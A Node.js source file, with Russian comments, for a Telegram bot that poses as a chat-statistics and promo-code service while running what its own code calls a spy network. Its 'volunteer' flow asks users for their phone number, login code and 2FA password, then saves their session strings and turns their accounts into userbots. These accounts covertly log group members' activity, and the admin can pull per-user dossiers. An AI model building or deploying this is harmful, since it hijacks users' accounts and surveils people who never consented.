const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const express = require('express');
const axios = require('axios');

// ====================================================================
// 🛡️ СИСТЕМА ЖЕЛЕЗОБЕТОННОЙ ЗАЩИТЫ ОТ КРАШЕЙ И ПАДЕНИЙ (АНТИ-КАПРИЗ)
// ====================================================================
process.on('uncaughtException', (err) => {
    console.error('🚨 [Критический перехват] Ошибка потока:', err.stack || err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🚨 [Критический перехват] Необработанный Promise:', reason);
});

// Глобальные ключи Telegram Desktop
const apiId = 2040;
const apiHash = "b18441a1ff607e10a989891a5462e627";

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID ? process.env.ADMIN_ID.toString() : "0"; 

if (!TELEGRAM_TOKEN) {
    console.error("❌ ОШИБКА: Переменная TELEGRAM_TOKEN отсутствует в Environment!");
    process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const authStates = {};
const activeSpyClients = [];

// ====================================================================
// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE С РАСШИРЕННЫМИ ТАБЛИЦАМИ СЕТИ И ПРОМО
// ====================================================================
const dbPath = path.join(__dirname, 'global_telelog.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS global_logs (
        chat_id TEXT, chat_title TEXT, user_id TEXT, username TEXT, first_name TEXT,
        msg_count INTEGER DEFAULT 0, sticker_count INTEGER DEFAULT 0, last_seen TEXT, last_hour INTEGER DEFAULT 0,
        PRIMARY KEY (chat_id, user_id)
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS spy_chats (
        chat_id TEXT PRIMARY KEY, chat_title TEXT, total_captured INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS spy_nodes (
        user_id TEXT PRIMARY KEY, phone TEXT, session_string TEXT, added_at TEXT
    )`);

    // 🔥 ТАБЛИЦА ПРОМОКОДОВ
    db.run(`CREATE TABLE IF NOT EXISTS promo_codes (
        code TEXT PRIMARY KEY,
        max_uses INTEGER,
        current_uses INTEGER DEFAULT 0,
        created_at TEXT
    )`);

    // 🔥 ТАБЛИЦА ПРОФИЛЕЙ И БАЛАНСА ЮЗЕРОВ
    db.run(`CREATE TABLE IF NOT EXISTS user_profiles (
        user_id TEXT PRIMARY KEY,
        balance INTEGER DEFAULT 0,
        used_promos TEXT DEFAULT ''
    )`);
});

// Универсальный обработчик входящих сообщений для ЛЮБОГО юзербота
async function registerSpyHandlers(client, accountName) {
    client.addEventHandler(async (event) => {
        const message = event.message;
        if (!message) return;

        try {
            if (!message.isGroup && !message.isChannel) return;

            const sender = await message.getSender();
            if (!sender || sender.bot) return;

            const chat = await message.getChat();
            const chatTitle = chat.title || "Скрытая группа";
            
            const chatId = message.chatId ? message.chatId.toString() : "";
            const userId = sender.id.toString();
            const username = sender.username ? `@${sender.username}` : "Без ника";
            const firstName = sender.firstName || "Пользователь";
            
            const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
            const isMsg = isSticker ? 0 : 1;
            
            const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();

            db.run(`
                INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
                    chat_title = excluded.chat_title, username = excluded.username, first_name = excluded.first_name,
                    msg_count = msg_count + excluded.msg_count, sticker_count = sticker_count + excluded.sticker_count,
                    last_seen = excluded.last_seen, last_hour = excluded.last_hour
            `, [chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour]);

            db.run(`
                INSERT INTO spy_chats (chat_id, chat_title, total_captured)
                VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
                    chat_title = excluded.chat_title, total_captured = total_captured + 1
                `, [chatId, chatTitle]);

        } catch (e) {}
    }, new NewMessage({}));
}

// Запуск пула шпионов
async function initAllSpyNodes() {
    if (process.env.TELEGRAM_SESSION) {
        const primarySession = new StringSession(process.env.TELEGRAM_SESSION);
        const primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
        try {
            await primaryClient.connect();
            const me = await primaryClient.getMe();
            console.log(`👑 [ГЛАВНЫЙ ШПИОН ЗАПУЩЕН]: @${me.username}`);
            activeSpyClients.push(primaryClient);
            await registerSpyHandlers(primaryClient, `Главный (@${me.username})`);
        } catch (e) { console.error("Ошибка запуска главного шпиона:", e.message); }
    }

    db.all(`SELECT * FROM spy_nodes`, [], async (err, rows) => {
        if (err || !rows) return;
        for (const row of rows) {
            const nodeSession = new StringSession(row.session_string);
            const nodeClient = new TelegramClient(nodeSession, apiId, apiHash, { connectionRetries: 3, useWSS: true });
            try {
                await nodeClient.connect();
                activeSpyClients.push(nodeClient);
                await registerSpyHandlers(nodeClient, `Узел (${row.phone})`);
            } catch (nodeErr) {
                db.run(`DELETE FROM spy_nodes WHERE user_id = ?`, [row.user_id]);
            }
        }
    });
}

// ====================================================================
// 🧠 ДИНАМИЧЕСКИЕ МЕНЮ (РАЗДЕЛЕНИЕ НА ЮЗЕРА И АДМИНА + ПРОМО)
// ====================================================================
function getMenuText(userId) {
    if (userId.toString() === ADMIN_ID) {
        return "⚡️ *АДМИН-ПАНЕЛЬ СЕТИ ШПИОНАЖА* ⚡️\n\n" +
               "Братан, тебе доступны скрытые функции управления промокодами и модули тотальной аналитики.";
    }
    return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ БОТ | ФАНСТАТ* ⚡️\n\n" +
           "Привет! Я собираю статистику активности в Telegram чатах.\n\n" +
           "📊 *Поиск чата:* Введи название чата или его юзернейм, чтобы узнать объем перехваченных логов.";
}

function getMenuButtons(userId) {
    if (userId.toString() === ADMIN_ID) {
        return {
            inline_keyboard: [
                [
                    { text: '🏆 Топ-10 Флудеров', callback_data: 'global_top' },
                    { text: '🏰 Мониторинг чатов', callback_data: 'chats_status' }
                ],
                [
                    { text: '🎟 Создать промокод', callback_data: 'create_promo_mode' },
                    { text: '🌐 Статус Сети', callback_data: 'network_status' }
                ],
                [
                    { text: '⚙️ На главную', callback_data: 'to_main' }
                ]
            ]
        };
    }
    return {
        inline_keyboard: [
            [
                { text: '🤝 Стать Добровольцем', callback_data: 'join_network' },
                { text: '🎟 Ввести промокод', callback_data: 'enter_promo_mode' }
            ],
            [
                { text: '👤 Мой профиль', callback_data: 'my_profile' },
                { text: '📖 Инструкция', callback_data: 'bot_info' }
            ]
        ]
    };
}

// Поиск чата для юзеров
function searchChatInDb(searchText, callback) {
    db.all(`SELECT * FROM spy_chats WHERE LOWER(chat_title) LIKE LOWER(?)`, [`%${searchText}%`], (err, rows) => {
        if (err || !rows || rows.length === 0) {
            return callback(`❌ *Чат не найден в системе.*\n\nНаши шпионы пока не зафиксировали активность в чатах с похожим названием.`);
        }
        let response = `🏰 *РЕЗУЛЬТАТЫ ПОИСКА ПО ЧАТАМ* 🏰\n\n`;
        rows.forEach((row, index) => {
            response += `${index + 1}. *${row.chat_title}*\n   └ 📊 Считано сообщений сети: *${row.total_captured}*\n\n`;
        });
        callback(response);
    });
}

// Поиск Юзера для админки/профиля
function searchUser(param, isUsername, callback) {
    let querySQL = isUsername ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)` : `SELECT * FROM global_logs WHERE user_id = ?`;
    db.all(querySQL, [param], (err, rows) => {
        if (err || !rows || rows.length === 0) return callback(`❌ *Объект не найден в базе данных логов.*`);
        let totalMsg = 0, totalStickers = 0, chatsList = '';
        rows.forEach(row => { totalMsg += row.msg_count; totalStickers += row.sticker_count; chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
        callback(`👤 *ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n• *Имя:* ${rows[0].first_name}\n• *Ник:* ${rows[0].username}\n• *ID:* \`${rows[0].user_id}\`\n\n🏰 *Замечен в чатах:*\n${chatsList}`);
    });
}

// ====================================================================
// 📥 ОБРАБОТЧИК ВХОДЯЩИХ ТЕКСТОВЫХ СООБЩЕНИЙ
// ====================================================================
bot.on('message', async (msg) => {
    if (msg.chat.type !== 'private') return;
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';
    const state = authStates[chatId];

    if (text === '/start') {
        delete authStates[chatId];
        // Гарантируем, что запись о профиле юзера есть в БД
        db.run(`INSERT OR IGNORE INTO user_profiles (user_id) VALUES (?)`, [chatId.toString()]);
        return bot.sendMessage(chatId, getMenuText(chatId), { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
    }

    // 🔥 АДМИН: Создание промокода (обработка ввода)
    if (state && state.step === 'WAITING_PROMO_CREATION' && chatId.toString() === ADMIN_ID) {
        if (!text.includes(':')) {
            return bot.sendMessage(chatId, "⚠️ *Ошибка формата.* Пришли код строго в виде `ПРОМО:КОЛИЧЕСТВО`. Пример: `VIP777:10` \nПопробуй заново:");
        }
        const [promoCode, rawMaxUses] = text.split(':');
        const maxUses = parseInt(rawMaxUses, 10);

        if (isNaN(maxUses) || maxUses <= 0) {
            return bot.sendMessage(chatId, "❌ Количество использований должно быть числом больше 0. Попробуй заново:");
        }

        const now = new Date().toLocaleString('ru-RU');
        db.run(`INSERT INTO promo_codes (code, max_uses, current_uses, created_at) VALUES (?, ?, 0, ?)
                ON CONFLICT(code) DO UPDATE SET max_uses = excluded.max_uses, current_uses = 0`, 
                [promoCode.toUpperCase(), maxUses, now], (err) => {
            if (err) return bot.sendMessage(chatId, "❌ Ошибка БД при создании промо.");
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *ПРОМОКОД УСПЕШНО СОЗДАН!* 🎉\n\n• Код: *${promoCode.toUpperCase()}*\n• Доступно активаций: *${maxUses}*\n\nМожешь раздавать его пользователям!`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
        });
        return;
    }

    // 👤 ЮЗЕР: Ввод промокода (обработка ввода)
    if (state && state.step === 'WAITING_PROMO_INPUT') {
        const inputCode = text.toUpperCase();

        db.get(`SELECT * FROM promo_codes WHERE code = ?`, [inputCode], (err, promo) => {
            if (err || !promo) {
                return bot.sendMessage(chatId, "❌ *Такого промокода не существует.* Проверь буквы и введи заново:");
            }

            if (promo.current_uses >= promo.max_uses) {
                return bot.sendMessage(chatId, "🔴 *Увы, лимит этого промокода исчерпан!* Больше его активировать нельзя.", { reply_markup: getMenuButtons(chatId) });
            }

            // Проверяем, вводил ли этот юзер этот код ранее
            db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, profile) => {
                const usedPromos = profile && profile.used_promos ? profile.used_promos.split(',') : [];
                
                if (usedPromos.includes(inputCode)) {
                    delete authStates[chatId];
                    return bot.sendMessage(chatId, "⚠️ *Ты уже активировал этот промокод ранее!* Повторно нельзя.", { reply_markup: getMenuButtons(chatId) });
                }

                // Всё ок — активируем! Увеличиваем счётчик использований в промокоде
                db.run(`UPDATE promo_codes SET current_uses = current_uses + 1 WHERE code = ?`, [inputCode]);
                
                // Добавляем промокод в список использованных юзером и начисляем бонусные очки (например, 100 баллов)
                usedPromos.push(inputCode);
                const updatedPromosString = usedPromos.join(',');
                
                db.run(`INSERT INTO user_profiles (user_id, balance, used_promos) VALUES (?, 100, ?)
                        ON CONFLICT(user_id) DO UPDATE SET balance = balance + 100, used_promos = ?`, 
                        [chatId.toString(), updatedPromosString, updatedPromosString], (err) => {
                    
                    delete authStates[chatId];
                    return bot.sendMessage(chatId, `🔥 *ПРОМОКОД УСПЕШНО АКТИВИРОВАН!* 🔥\n\nТебе начислено *100 Бонусных Кредитов* на баланс профиля! Спасибо, что ты с нами.`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
                });
            });
        });
        return;
    }

    // Обычные этапы авторизации юзерботов (телефон -> код -> 2FA)
    if (state && state.step === 'WAITING_PHONE') {
        const phone = text.replace(/\s+/g, '');
        if (!phone.startsWith('+')) return bot.sendMessage(chatId, "❌ Телефон должен начинаться с `+`.");
        bot.sendMessage(chatId, "⏳ Связываюсь с серверами Telegram...");
        const tempClient = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 3, useWSS: true });
        try {
            await tempClient.connect();
            const phoneCodeHash = await tempClient.sendCode({ apiId, apiHash }, phone);
            authStates[chatId] = { step: 'WAITING_CODE', phone: phone, phoneCodeHash: phoneCodeHash.phoneCodeHash, client: tempClient };
            return bot.sendMessage(chatId, `📬 Код отправлен на номер *${phone}*. Введи его:`);
        } catch (err) { return bot.sendMessage(chatId, `❌ Ошибка: \`${err.message}\`. Повтори:`); }
    }

    if (state && state.step === 'WAITING_CODE') {
        try {
            await state.client.signIn({ phoneNumber: state.phone, phoneCodeHash: state.phoneCodeHash, phoneCode: text });
            const me = await state.client.getMe();
            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`, [me.id.toString(), state.phone, state.client.session.save(), new Date().toLocaleString('ru-RU')]);
            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, `Узел (@${me.username})`);
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *Аккаунт успешно подключен!*`);
        } catch (err) {
            if (err.message.includes("SESSION_PASSWORD_NEEDED")) {
                authStates[chatId].step = 'WAITING_PASSWORD';
                return bot.sendMessage(chatId, "🔑 Введи облачный пароль (2FA):");
            }
            return bot.sendMessage(chatId, `❌ Неверный код.`);
        }
    }

    if (state && state.step === 'WAITING_PASSWORD') {
        try {
            await state.client.signIn({ password: text });
            const me = await state.client.getMe();
            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`, [me.id.toString(), state.phone, state.client.session.save(), new Date().toLocaleString('ru-RU')]);
            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, `Узел (@${me.username})`);
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *Аккаунт с 2FA успешно подключен!*`);
        } catch (err) { return bot.sendMessage(chatId, `❌ Пароль неверный.`); }
    }

    // Роутинг поиска
    if (chatId.toString() === ADMIN_ID) {
        let param = text; let isUsername = false;
        if (msg.forward_from) param = msg.forward_from.id.toString();
        else if (text.startsWith('@')) isUsername = true;
        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Админ, вбивай `@username` юзера или ID.");
        searchUser(param, isUsername, (res) => {
            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } });
        });
    } else {
        searchChatInDb(text, (res) => {
            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В меню', callback_data: 'to_main' }]] } });
        });
    }
});

// ====================================================================
// 🎛️ СИСТЕМА НАЖАТИЙ (ОБРАБОТКА ОБНОВЛЕНИЙ ИНЛАЙН И ПРОМОКНОПОК)
// ====================================================================
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    if (data === 'to_main') {
        delete authStates[chatId];
        bot.editMessageText(getMenuText(chatId), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) }).catch(() => {});
    }

    // ⛔️ АДМИН-КНОПКИ
    else if (data === 'create_promo_mode') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
        authStates[chatId] = { step: 'WAITING_PROMO_CREATION' };
        bot.editMessageText("🎟 *РЕЖИМ СОЗДАНИЯ ПРОМОКОДА*\n\nПришли строку в формате `ПРОМО:КОЛИЧЕСТВО_АКТИВАЦИЙ`.\n\n*Пример:* `WANTED:5` (Промокод WANTED на 5 юзеров):", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    else if (data === 'global_top') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
        db.all(`SELECT username, first_name, SUM(msg_count) as total FROM global_logs GROUP BY user_id ORDER BY total DESC LIMIT 10`, [], (err, rows) => {
            let topText = "🏆 *ТОП-10 САМЫХ АКТИВНЫХ ПОЛЬЗОВАТЕЛЕЙ СЕТИ* 🏆\n\n";
            if (err || !rows || rows.length === 0) topText += "_База пуста._";
            else rows.forEach((row, index) => { topText += `${index + 1}. *${row.first_name}* (${row.username}) — 💬 *${row.total}*\n`; });
            bot.editMessageText(topText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    else if (data === 'chats_status') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
        db.all(`SELECT * FROM spy_chats ORDER BY total_captured DESC`, [], (err, rows) => {
            let chatText = "🏰 *МОНИТОРИНГ ЧАТОВ СЕТИ* 🏰\n\n";
            if (err || !rows || rows.length === 0) chatText += "_Чаты отсутствуют._";
            else rows.forEach((row, index) => { chatText += `${index + 1}. *${row.chat_title}* — Считано: *${row.total_captured}*\n`; });
            bot.editMessageText(chatText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    else if (data === 'network_status') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Доступ заблокирован!", show_alert: true });
        db.get(`SELECT COUNT(*) as count FROM spy_nodes`, [], (err, row) => {
            const nodesCount = row ? row.count : 0;
            const netStatus = `🌐 *МОНИТОРИНГ СЕТИ ШПИОНАЖА*\n\n• Активно узлов онлайн: *${activeSpyClients.length}*\n• Сдано добровольцами: *${nodesCount}*`;
            bot.editMessageText(netStatus, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    // 🔓 КНОПКИ ДЛЯ ЮЗЕРОВ
    else if (data === 'enter_promo_mode') {
        authStates[chatId] = { step: 'WAITING_PROMO_INPUT' };
        bot.editMessageText("🎟 *АКТИВАЦИЯ БОНУСНОГО ПРОМОКОДА*\n\nВведите ваш секретный промокод для зачисления кредитов лояльности на ваш баланс:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    else if (data === 'join_network') {
        authStates[chatId] = { step: 'WAITING_PHONE' };
        bot.editMessageText("🤝 *РЕЖИМ ДОБРОВОЛЬЦА СЕТИ*\n\nВведи телефон в формате `+79991234567`:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    else if (data === 'my_profile') {
        db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, row) => {
            const balance = row ? row.balance : 0;
            const profileText = `👤 *ТВОЙ ЛИЧНЫЙ ПРОФИЛЬ* 👤\n\n` +
                                `• Твой Telegram ID: \`${chatId}\`\n` +
                                `• Бонусный баланс: *${balance}* Кредитов\n\n` +
                                `💡 Пополнять баланс можно с помощью секретных промокодов от Администрации.`;
            bot.editMessageText(profileText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    else if (data === 'bot_info') {
        bot.editMessageText("📖 *СПРАВКА ДЛЯ ПОЛЬЗОВАТЕЛЕЙ*\n\nПросто отправь мне название или юзернейм любого чата, чтобы узнать, сколько логов активности в нём зафиксировано нашей сетью.", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    try { bot.answerCallbackQuery(query.id); } catch(e) {}
});

initAllSpyNodes();

// ====================================================================
// 🌐 ВЕБ-СЕРВЕР И АВТО-ПИНГ
// ====================================================================
const app = express();
app.get('/', (req, res) => res.send('Promo Voucher Shield Active'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[Executive Server] Системный хаб развернут на порту: ${PORT}`);
    setInterval(() => {
        const url = process.env.RENDER_EXTERNAL_URL;
        if (url) axios.get(url).catch(() => {});
    }, 180000);
});
